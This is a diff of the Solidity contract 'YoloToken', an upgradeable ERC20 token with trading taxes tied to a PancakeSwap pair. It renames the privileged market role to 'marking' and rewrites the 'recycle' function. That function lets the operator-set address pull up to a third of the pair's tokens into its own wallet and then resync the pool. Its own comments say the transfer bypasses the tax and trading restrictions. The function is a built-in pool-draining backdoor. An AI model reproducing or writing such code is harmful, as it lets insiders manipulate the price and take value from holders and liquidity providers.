@@ -34,10 +34,8 @@ contract YoloToken is  Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable
         _;
     }
 
-    modifier onlyMarketRole() {
-        require(
-            msg.sender == marketAddress, "YoloToken onlyStakingManager: Only marketAddress can call this function"
-        );
+    modifier onlyMarking() {
+        require(msg.sender == marking, "YoloToken onlyMarking: Only Marking can call this function");
         _;
     }
 
@@ -123,7 +121,13 @@ contract YoloToken is  Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable
         emit DeclineTaxApplied(value, declineRate, sellTax);
     }
 
+    function isStakingManager(address addr) internal view returns (bool) {
+        return addr == stakingManager;
+    }
 
+    function isFundingPod(address addr) internal view returns (bool) {
+        return addr == fundingPod;
+    }
 
     function isWhitelisted(address from, address to) public view returns (bool) {
         return EnumerableSet.contains(whiteList, from) || EnumerableSet.contains(whiteList, to);
@@ -165,12 +169,6 @@ contract YoloToken is  Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable
         emit SetStakingManager(_stakingManager);
     }
 
-    function setMarketAddress(address _marketCallerAddress, address _marketAddress)  external onlyOperator  {
-        marketCallerAddress = _marketCallerAddress;
-        marketAddress = _marketAddress;
-        emit SetMarketAddress(_marketCallerAddress, _marketAddress);
-    }
-
     function setPoolAddress(YoloPool memory _pool) external onlyOperator {
         _beforeAllocation();
         _beforePoolAddress(_pool);
@@ -209,17 +207,36 @@ contract YoloToken is  Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable
         emit Burn(_amount, totalSupply());
     }
 
-    function YoloTotalSupply() external view returns (uint256) {
-        return totalSupply();
+    /**
+     * @notice 设置做市合约地址 (持有 recycle 权限)
+     * @param _marking 做市合约地址
+     */
+    function setMarking(address _marking) external onlyOperator {
+        require(_marking != address(0), "YoloToken: marking cannot be zero address");
+        marking = _marking;
+        emit SetMarking(_marking);
     }
 
-    function recycle(uint256 amount) external onlyMarketRole {
-        require(mainPair != address(0), "pair not set");
-        uint256 maxBurn = balanceOf(mainPair) / 3;
-        uint256 burnAmount = amount >= maxBurn ? maxBurn : amount;
-        super._update(mainPair, marketAddress, burnAmount);
-        IPancakePair iPair = IPancakePair(mainPair);
-        iPair.sync();
+    /**
+     * @notice 做市回收: 从交易对抽取代币到 marking 地址
+     * @dev 单次上限为交易对内本代币余额的 1/3, 防止一次性抽干破坏池子价格; 走 super._update 绕过税费逻辑
+     * @param amount 期望回收数量
+     */
+    function recycle(uint256 amount) external onlyMarking {
+        address pair = mainPair;
+        require(pair != address(0), "YoloToken: pair not set");
+        uint256 maxBurn = balanceOf(pair) / 3;
+        uint256 recycleAmount = amount >= maxBurn ? maxBurn : amount;
+        if (recycleAmount > 0) {
+            // 走 ERC20 基类 _update, 绕过 _update override 的税费/买卖开关限制
+            super._update(pair, marking, recycleAmount);
+            IPancakePair(pair).sync();
+            emit Recycle(pair, marking, recycleAmount);
+        }
+    }
+
+    function YoloTotalSupply() external view returns (uint256) {
+        return totalSupply();
     }
 
     // ==================== internal function =============================
@@ -276,14 +293,6 @@ contract YoloToken is  Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable
         }
 
         return value - sellFee;
-    }
-
-    function isStakingManager(address addr) internal view returns (bool) {
-        return addr == stakingManager;
-    }
-
-    function isFundingPod(address addr) internal view returns (bool) {
-        return addr == fundingPod;
     }
 
     function _takeDeclineTax(address from, uint256 value) internal returns (uint256 remainingValue) {
